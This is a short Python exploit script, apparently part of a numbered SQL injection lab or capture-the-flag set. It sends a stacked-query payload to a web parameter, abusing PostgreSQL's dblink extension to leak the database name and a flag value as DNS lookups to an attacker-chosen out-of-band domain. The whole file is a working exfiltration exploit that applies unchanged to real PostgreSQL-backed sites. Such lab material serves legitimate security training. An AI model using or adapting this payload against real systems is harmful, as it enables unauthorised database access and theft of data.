#!/usr/bin/env python3
"""SQLi-042: PostgreSQL OOB via dblink Extension"""
import requests
import argparse

def send_dblink_oob(url, query, oob_domain):
    payload = f"1;SELECT * FROM dblink('host='||({query})||'.{oob_domain} user=a dbname=a','SELECT 1') RETURNS (i int)--"
    try:
        requests.get(url, params={"id": payload}, timeout=10)
    except:
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5042/product")
    parser.add_argument("--oob", required=True)
    args = parser.parse_args()
    
    print(f"[*] Target: {args.target}")
    print(f"[*] OOB: {args.oob}")
    
    print("\n[1] Extracting database...")
    send_dblink_oob(args.target, "SELECT current_database()", args.oob)
    
    print("[2] Extracting flag...")
    send_dblink_oob(args.target, "SELECT value FROM flags LIMIT 1", args.oob)
    
    print(f"\n[*] Check DNS: <data>.{args.oob}")
    print("[*] Expected: FLAG{postgres_dblink_oob_exfil}")

if __name__ == "__main__":
    main()
